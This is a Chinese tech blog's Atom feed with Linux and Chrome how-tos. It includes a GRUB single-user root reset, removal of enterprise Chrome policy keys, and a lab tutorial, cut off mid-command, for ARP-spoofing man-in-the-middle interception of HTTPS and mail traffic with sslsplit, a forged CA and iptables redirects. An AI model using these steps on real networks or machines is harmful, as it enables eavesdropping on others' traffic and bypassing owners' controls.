@@ -1,0 +1,684 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>赛博空间</title>
+  <icon>https://macin.top/img/ast.webp</icon>
+  <subtitle>Cyber</subtitle>
+  <link href="https://macin.top/atom.xml" rel="self"/>
+  
+  <link href="https://macin.top/"/>
+  <updated>2024-12-19T15:25:35.227Z</updated>
+  <id>https://macin.top/</id>
+  
+  <author>
+    <name>马斯克</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>windows远程访问ubuntu服务器桌面，安装XRDP远程桌面</title>
+    <link href="https://macin.top/posts/b69b7f1c/"/>
+    <id>https://macin.top/posts/b69b7f1c/</id>
+    <published>2024-12-19T14:43:04.000Z</published>
+    <updated>2024-12-19T15:25:35.227Z</updated>
+    
+    <content type="html"><![CDATA[<p>执行命令：</p><p>用root用户登录vps </p><p>如何创建root用户： </p><p>步骤1： 给root用户设置密码： </p><p>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure><p>输入密码，并确认密码。 </p><p>步骤2： 重新输入命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure><p>然后输入密码： 发现可以切换到root权限了。 </p><p>如何切换到root用户： </p><p>步骤1： 重新输入命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure><p>然后输入密码： 发现可以切换到root权限了。</p><p>添加新用户 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adduser noss </span><br><span class="line"><span class="comment">#noss为新添加的用户名</span></span><br></pre></td></tr></table></figure><p>安装 Ubuntu 图形用户界面 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update -y </span><br><span class="line"></span><br><span class="line">sudo apt install ubuntu-desktop -y</span><br></pre></td></tr></table></figure><p>安装和配置 RDP 服务器 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install xrdp -y </span><br><span class="line"></span><br><span class="line">sudo systemctl status xrdp </span><br><span class="line"></span><br><span class="line">sudo vim /etc/xrdp/xrdp.ini </span><br></pre></td></tr></table></figure><p>修改： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">port=tcp://:3389</span><br></pre></td></tr></table></figure><hr><p>启动RDP服务 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart xrdp</span><br></pre></td></tr></table></figure><p>在防火墙上打开 RDP 端口（如果有防火墙） </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw allow 3389</span><br></pre></td></tr></table></figure><p>安装chrome 浏览器 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install chromium-browser</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">ubuntu,os</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux安装和配置v2rayn</title>
+    <link href="https://macin.top/posts/3c4072e6/"/>
+    <id>https://macin.top/posts/3c4072e6/</id>
+    <published>2024-12-19T12:45:05.000Z</published>
+    <updated>2024-12-19T15:25:35.224Z</updated>
+    
+    <content type="html"><![CDATA[<p>v2rayN下载：<a href="https://github.com/2dust/v2rayN/releases">Releases · 2dust&#x2F;v2rayN</a></p><p>添加执行权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x v2rayN</span><br></pre></td></tr></table></figure><p>启动：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./v2rayN</span><br></pre></td></tr></table></figure><p>tun模式启动：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./v2rayN</span><br></pre></td></tr></table></figure><p>桌面图标启动</p><p>在桌面文件夹，下创建v2rayN.desktop文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> v2rayN.desktop</span><br></pre></td></tr></table></figure><p>编辑如下配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Version=1.0</span><br><span class="line">Name=v2rayN</span><br><span class="line">Comment=一款稳定的桌面代理客户端软件</span><br><span class="line">Exec=v2rayN文件路径</span><br><span class="line">Icon=v2rayN图标路径</span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line">Type=Application</span><br><span class="line">Categories=Utility;</span><br></pre></td></tr></table></figure><p>添加执行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x v2rayN.desktop</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">v2ray,proxy,linux,kali,debian</summary>
+    
+    
+    
+    <category term="proxy" scheme="https://macin.top/categories/proxy/"/>
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    <category term="v2ray" scheme="https://macin.top/categories/proxy/v2ray/"/>
+    
+    
+    <category term="tools" scheme="https://macin.top/tags/tools/"/>
+    
+    <category term="proxy" scheme="https://macin.top/tags/proxy/"/>
+    
+    <category term="linux" scheme="https://macin.top/tags/linux/"/>
+    
+    <category term="v2ray" scheme="https://macin.top/tags/v2ray/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux中的cron如何设置和管理</title>
+    <link href="https://macin.top/posts/5743d22f/"/>
+    <id>https://macin.top/posts/5743d22f/</id>
+    <published>2024-12-19T12:25:48.000Z</published>
+    <updated>2024-12-19T15:25:35.224Z</updated>
+    
+    <content type="html"><![CDATA[<p>在Kali Linux中，可以使用crontab命令来设置和管理Cron作业。以下是一些常用的操作：</p><p>查看当前用户的Cron作业列表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure><p>编辑当前用户的Cron作业：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure><p>这将打开一个文本编辑器，您可以在其中编写和编辑Cron作业。每行表示一个Cron作业，格式为：分钟 小时 日 月 周 命令。</p><p>删除当前用户的Cron作业：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -r</span><br></pre></td></tr></table></figure><p>添加一个新的Cron作业：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure><p>然后在文本编辑器中添加新的Cron作业。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nano  <span class="comment">#编辑器 </span></span><br><span class="line"></span><br><span class="line">ctrl+x <span class="comment">#退出保存</span></span><br></pre></td></tr></table></figure><p>查看系统中所有用户的Cron作业：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /var/spool/cron/crontabs</span><br></pre></td></tr></table></figure><p>执行Cron作业： Cron作业将在指定的时间自动执行，您无需手动执行。您可以在**&#x2F;var&#x2F;log&#x2F;syslog**中查看Cron作业的执行情况。</p><p>查看Cron服务状态：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service cron status</span><br></pre></td></tr></table></figure><p>通过以上方法，您可以设置和管理Kali Linux中的Cron作业。请注意，对于某些敏感任务，建议谨慎设置Cron作业，以免造成系统问题。</p><p>例子：</p><p>每天11：12执行shell自动化脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12 11 * * * /bin/bash path/to/xxx.sh</span><br></pre></td></tr></table></figure><p>每月的第一天凌晨4点同步数据到远程服务器</p><p>如果我们需要每月的第一天凌晨4点将数据同步到远程服务器，可以在<code>crontab</code>文件中添加如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 4 1 * * rsync -avz /data/ user@remote-server:/data/</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">linux,os,ubuntu,debian</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>kali实现开机root权限</title>
+    <link href="https://macin.top/posts/3e38cd7e/"/>
+    <id>https://macin.top/posts/3e38cd7e/</id>
+    <published>2024-12-19T12:09:07.000Z</published>
+    <updated>2024-12-19T15:25:35.224Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="一、新版介绍"><a href="#一、新版介绍" class="headerlink" title="一、新版介绍"></a><strong>一、新版介绍</strong></h2><p>Kali默认不是以root管理员身份运行的，有时候像我这样的懒人每次都要sudo su提升权限，就很麻烦。所以这里我介绍一种在Kali中完美以root权限执行的方法。</p><h2 id="二、实验步骤"><a href="#二、实验步骤" class="headerlink" title="二、实验步骤"></a><strong>二、实验步骤</strong></h2><p>查看您的Kali是否处于root权限，$为普通用户 #为root模式。</p><p><img src="/img/kaliroot/1.webp"></p><p><img src="/img/kaliroot/2.webp"></p><p>接下来我们开始进行配置，首先重启kali进而配置单用户模式，输入命令：reboot，重启。</p><p>在如下图所示的页面按住字母e键，进入如下图所示的页面进行配置。</p><p><img src="/img/kaliroot/3.webp"></p><p><img src="/img/kaliroot/4.webp"></p><blockquote><p>更改配置文件，在linux这一行，将ro改为rw，在splash后空一格，添加命令：init&#x3D;&#x2F;bin&#x2F;bash,如下图所示。</p></blockquote><p><img src="/img/kaliroot/5.webp"></p><p>配置完上图的页面后，按住f10进入以下单用户页面，如下图所示，回车继续。</p><p>系统进入单用户的命令行模式</p><p><img src="/img/kaliroot/6.webp"></p><p><strong>更改root（管理员用户）用户密码，如下图所示。</strong></p><p><strong>命令：passwd root</strong></p><p><strong>New password:</strong></p><p><strong>Retype new password:</strong></p><p><img src="/img/kaliroot/7.webp"></p><p>最后重启客户端，用root用户登录就好了。</p>]]></content>
+    
+    
+    <summary type="html">kali,os,hack</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    <category term="hack" scheme="https://macin.top/categories/hack/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="hack" scheme="https://macin.top/tags/hack/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>解决linux无法使用drissionpage库打开chrome的问题</title>
+    <link href="https://macin.top/posts/42310953/"/>
+    <id>https://macin.top/posts/42310953/</id>
+    <published>2024-12-18T14:35:41.000Z</published>
+    <updated>2024-12-19T15:25:35.231Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DrissionPage <span class="keyword">import</span> ChromiumPage</span><br><span class="line"><span class="keyword">from</span> DrissionPage <span class="keyword">import</span> ChromiumOptions</span><br><span class="line"><span class="keyword">from</span> DrissionPage.easy_set <span class="keyword">import</span> set_headless, set_paths</span><br><span class="line">set_headless(<span class="literal">True</span>)  <span class="comment">#无头模式，隐藏浏览器运行</span></span><br><span class="line"></span><br><span class="line">co = ChromiumOptions()</span><br><span class="line">co.set_paths(browser_path=<span class="string">r&#x27;/usr/bin/google-chrome&#x27;</span>)  <span class="comment">#注意chrome的执行文件位置</span></span><br><span class="line"><span class="comment">#co.set_argument(&#x27;--incognito&#x27;)   #可有可无，未知用法</span></span><br><span class="line">co.set_argument(<span class="string">&#x27;--no-sandbox&#x27;</span>)   <span class="comment">#linux要加入这一行代码</span></span><br><span class="line"></span><br><span class="line">page = ChromiumPage(co)</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">centos,ubuntu,os,debian,kali</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="centos" scheme="https://macin.top/categories/os/centos/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="centos" scheme="https://macin.top/tags/centos/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="linux" scheme="https://macin.top/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux安装pythonvenv环境</title>
+    <link href="https://macin.top/posts/f717803c/"/>
+    <id>https://macin.top/posts/f717803c/</id>
+    <published>2024-12-18T14:20:04.000Z</published>
+    <updated>2024-12-19T15:25:35.224Z</updated>
+    
+    <content type="html"><![CDATA[<p>在Kali Linux系统中，Python venv是一个非常有用的工具，可以帮助用户在虚拟环境中独立安装和管理Python包。本文将介绍如何在Kali Linux系统上安装Python venv环境，并演示如何使用它来创建和管理虚拟环境。</p><h3 id="步骤一：安装Python-venv"><a href="#步骤一：安装Python-venv" class="headerlink" title="步骤一：安装Python venv"></a>步骤一：安装Python venv</h3><p>首先，确保你的Kali Linux系统已经安装了Python。如果尚未安装Python，可以使用以下命令安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install python3</span><br></pre></td></tr></table></figure><p>一旦Python安装完成，你可以安装Python venv模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-venv</span><br></pre></td></tr></table></figure><h3 id="步骤二：创建虚拟环境"><a href="#步骤二：创建虚拟环境" class="headerlink" title="步骤二：创建虚拟环境"></a>步骤二：创建虚拟环境</h3><p>接下来，我们将演示如何在Kali Linux系统上创建一个名为<code>myenv</code>的新虚拟环境。请按照以下步骤操作：</p><p>首先，创建一个新目录来存储虚拟环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> myenv</span><br><span class="line"><span class="built_in">cd</span> myenv</span><br></pre></td></tr></table></figure><p>然后，在该目录中创建一个名为<code>venv</code>的虚拟环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m venv venv</span><br></pre></td></tr></table></figure><p>激活虚拟环境，：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> venv/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者cd到venv/bin的位置去activate</span></span><br></pre></td></tr></table></figure><blockquote><p>激活虚拟环境后，你会注意到终端提示符前会显示<code>(venv)</code>，表示当前已经进入了虚拟环境。</p></blockquote><h3 id="步骤三：使用虚拟环境"><a href="#步骤三：使用虚拟环境" class="headerlink" title="步骤三：使用虚拟环境"></a>步骤三：使用虚拟环境</h3><p>一旦虚拟环境已经激活，你可以在其中安装和管理Python包。例如，我们可以使用<a href="https://edu.51cto.com/lesson/970202.html?utm_platform=pc&utm_medium=51cto&utm_source=shequ&utm_content=bk_article_keyword#pip">pip</a>在虚拟环境中安装一个名为<code>requests</code>的包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure><p>如果你想退出虚拟环境，只需运行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过本文的介绍，你已经学会了在Kali Linux系统上安装和使用Python venv环境的方法。使用虚拟环境可以帮助你更好地管理Python包，避免不必要的冲突。希望这篇文章对你有所帮助！</p>]]></content>
+    
+    
+    <summary type="html">centos,ubuntu,os,debian,kali,python3,coding</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="coding" scheme="https://macin.top/categories/coding/"/>
+    
+    <category term="centos" scheme="https://macin.top/categories/os/centos/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    <category term="python3" scheme="https://macin.top/categories/coding/python3/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="centos" scheme="https://macin.top/tags/centos/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="coding" scheme="https://macin.top/tags/coding/"/>
+    
+    <category term="linux" scheme="https://macin.top/tags/linux/"/>
+    
+    <category term="python3" scheme="https://macin.top/tags/python3/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>chrome和edge浏览器进阶设置</title>
+    <link href="https://macin.top/posts/1601f0a/"/>
+    <id>https://macin.top/posts/1601f0a/</id>
+    <published>2024-12-17T12:22:23.000Z</published>
+    <updated>2024-12-19T15:25:35.220Z</updated>
+    
+    <content type="html"><![CDATA[<p>Chrome浏览器进阶设置，一套提升谷歌浏览器整体使用体验的解决方案，全方位设置谷歌浏览器，实现提升网页打开速度|提升下载速度，真正发挥出谷歌浏览器应有的样子！</p><h1 id="1、关闭安全搜索"><a href="#1、关闭安全搜索" class="headerlink" title="1、关闭安全搜索"></a>1、关闭安全搜索</h1><ul><li><p>打开google.com——点击右下角的设置——点击搜索设置——点击安全搜索——选择关闭</p></li><li><p>浏览器选项中提示“<strong>由贵单位管理</strong>”解决方案</p><ul><li>谷歌 <code>Chrome</code> 浏览器地址栏输入 <code>Chrome://policy</code> ，即可看到调用企业策略的第三方软件或者是用户主动安装的第三方扩展等。</li><li>Windows系统按WIN+R输入“regedit”运行注册表管理</li><li>删除注册表\HKEY_CURRENT_USER\Software\Policies\Google\Chrome\下对应的文件夹（删除整个Chrome目录）<ul><li>HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome（<strong>如果上面的目录找不到，用这个</strong>）</li></ul></li></ul></li></ul><h1 id="2、提升网页打开速度"><a href="#2、提升网页打开速度" class="headerlink" title="2、提升网页打开速度"></a>2、提升网页打开速度</h1><ul><li><p>关闭使用安全DNS（所谓的安全DNS，也就是加密DNS，启用后有大概率导致打开网页缓慢）</p><ul><li>设置——点击隐私和安全——关闭使用安全DNS（此功能如果有需要，可以开启）</li></ul></li><li><p>设置——性能——开启预加载——选择扩展型预加载&#x2F;标准预加载（本操作会占用内存，根据自己电脑配置来选择）</p><ul><li>优点：<ul><li>加快网页加载速度。</li><li>减少了等待时间，体验更加流畅。</li><li>提前进行 DNS 解析和链接预取，浏览器可以减少网络延迟，在某些网络环境中有助于提升页面响应速度。</li><li>减少因为网络波动或其他问题导致的加载失败，提升页面的可靠性。</li></ul></li><li>缺点：<ul><li>增加流量消耗。</li><li>占用内存和 CPU 资源，打开标签页时间越长，占用资源越多。</li><li>占用大量缓存空间，导致缓存快速填满。</li></ul></li></ul></li><li><p>设置——点击系统——开启硬件加速（根据自己电脑配置来选择，一般情况下选择开启）</p><ul><li>优点：<ul><li>显著提升浏览器的渲染速度，使网页滚动和动画更流畅，视频播放更加顺畅。</li><li>降低 CPU 负载，减少卡顿。</li></ul></li><li>缺点：<ul><li>增加 GPU 占用</li><li>增加显卡功耗</li></ul></li></ul></li><li><p><strong>开启前面两个功能的情况下，注意关闭未使用的标签页，打开的标签页越多，Chrome 的运行速度就越慢。</strong></p></li></ul><h1 id="3、安全设置"><a href="#3、安全设置" class="headerlink" title="3、安全设置"></a>3、安全设置</h1><ul><li><p>启用密码管理</p><ul><li>点击右上角三个小点——点击密码和自动填充——点击Google密码管理工具——点击设置——启用提示保存密码和通行密钥和自动登录</li></ul></li><li><p>启用安全浏览</p><ul><li>设置——点击隐私和安全——选择标准保护——启用一律使用安全连接</li></ul></li></ul><h1 id="4、开启Chrome实验室功能"><a href="#4、开启Chrome实验室功能" class="headerlink" title="4、开启Chrome实验室功能"></a>4、开启Chrome实验室功能</h1><ul><li>打开chrome:&#x2F;&#x2F;flags&#x2F;页面<ul><li>Experimental QUIC protocol：启用QUIC协议，可以提高网页加载速度，尤其在网络延迟较高时。</li><li>GPU rasterization：启用GPU光栅化，可以提高图形渲染性能，尤其在处理图形密集型的网站时。</li><li>Smooth Scrolling：启用平滑滚动，可以改善网页滚动体验，使之更加流畅。</li><li>Parallel downloading：启用并行下载以加快下载速度。</li><li>Overlay Scrollbars：自动收起滚动条。</li></ul></li></ul><h1 id="5、安装扩展提升浏览体验"><a href="#5、安装扩展提升浏览体验" class="headerlink" title="5、安装扩展提升浏览体验"></a>5、安装扩展提升浏览体验</h1><ul><li>点击右上角三个小点——点击扩展程序——点击访问Chrome应用商店<ul><li><a href="https://chromewebstore.google.com/detail/adguard-%E5%B9%BF%E5%91%8A%E6%8B%A6%E6%88%AA%E5%99%A8/bgnkhhnnamicmpeenaelnjfhikgbkllg?hl=zh-CN&utm_source=ext_sidebar">AdGuard 广告拦截器</a></li><li><a href="https://chromewebstore.google.com/detail/%E7%AF%A1%E6%94%B9%E7%8C%B4/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=zh-CN&utm_source=ext_sidebar">Tampermonkey</a>（下载脚本常用）</li><li><a href="https://chromewebstore.google.com/detail/%E6%B8%85%E6%B4%81%E5%B7%A5-%E5%88%A0%E9%99%A4cookie%E5%92%8C%E7%BC%93%E5%AD%98/ogfjgagnmkiigilnoiabkbbajinanlbn?utm_source=ext_app_menu">清洁工 – 删除cookie和缓存</a>（配合前面的设置使用）</li></ul></li></ul>]]></content>
+    
+    
+    <summary type="html">chrome,web</summary>
+    
+    
+    
+    <category term="web" scheme="https://macin.top/categories/web/"/>
+    
+    <category term="chrome" scheme="https://macin.top/categories/web/chrome/"/>
+    
+    
+    <category term="web" scheme="https://macin.top/tags/web/"/>
+    
+    <category term="chrome" scheme="https://macin.top/tags/chrome/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>利用sslsplit+arpspoof实现arp欺骗</title>
+    <link href="https://macin.top/posts/ec393b70/"/>
+    <id>https://macin.top/posts/ec393b70/</id>
+    <published>2024-12-16T15:14:08.000Z</published>
+    <updated>2024-12-19T15:25:35.228Z</updated>
+    
+    <content type="html"><![CDATA[<p>准备</p><blockquote><p>一台win7虚拟机，IP：192.168.88.130   默认网关：192.168.88.2</p><p>一台kali虚拟机，IP：192.168.88.129</p></blockquote><p>SSLsplit 是一个针对 SSL&#x2F;TLS 加密的网络连接进行攻击，为网络取证和渗透测试的工具。它会终止 SSL &#x2F; TLS 和启动一个新的连接到原来的目的地，记录所有传输的数据。它支持普通的 TCP 和 SSL，HTTP 和 HTTPS，和 IPv4 和 IPv6。http不做介绍仅仅实现代理功能，ssl实现代理的同时要与服务器建立连接，同时伪造证书与客户端建立连接，即双连接，依据获取的client信息再与服务器通信，从而实现明文数据监听。</p><h1 id="1、利用openssl生成证书私钥"><a href="#1、利用openssl生成证书私钥" class="headerlink" title="1、利用openssl生成证书私钥"></a>1、利用openssl生成证书私钥</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out ca.key 2048</span><br></pre></td></tr></table></figure><h1 id="2、利用私钥签名生成证书"><a href="#2、利用私钥签名生成证书" class="headerlink" title="2、利用私钥签名生成证书"></a>2、利用私钥签名生成证书</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</span><br></pre></td></tr></table></figure><p>在目录下生成ca.key私钥文件和ca.crt证书文件</p><h1 id="3、开启路由转发功能"><a href="#3、开启路由转发功能" class="headerlink" title="3、开启路由转发功能"></a>3、开启路由转发功能</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.ip_forward=1</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/sys/net/ipv4/ip_forward</span><br><span class="line">1             <span class="comment">#屏幕输出1，说明开启成功</span></span><br></pre></td></tr></table></figure><h1 id="4、设置iptables端口转发规则"><a href="#4、设置iptables端口转发规则" class="headerlink" title="4、设置iptables端口转发规则"></a>4、设置iptables端口转发规则</h1><h2 id="1、清空当前表规则："><a href="#1、清空当前表规则：" class="headerlink" title="1、清空当前表规则："></a>1、清空当前表规则：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -F  </span><br></pre></td></tr></table></figure><h2 id="2、设置iptables端口转发规则："><a href="#2、设置iptables端口转发规则：" class="headerlink" title="2、设置iptables端口转发规则："></a>2、设置iptables端口转发规则：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080　【<span class="comment">#HTTP】</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443 【<span class="comment">#HTTPS】</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 【<span class="comment">#MSA】</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 【<span class="comment">#SMTPS】</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 【<span class="comment">#IMAPS】</span></span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 【<span class="comment">#POP3S】</span></span><br></pre></td></tr></table></figure><p>（-t:指定表;-A PERROUTING:路由前生效;-p:指定协议;–dport:接受流量的端口;-j:指定处理方法（REDIRECT重定向）;–to-ports:转发端口）</p><h2 id="3、使用该命令显示所有刚才配置的规则："><a href="#3、使用该命令显示所有刚才配置的规则：" class="headerlink" title="3、使用该命令显示所有刚才配置的规则："></a>3、使用该命令显示所有刚才配置的规则：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat 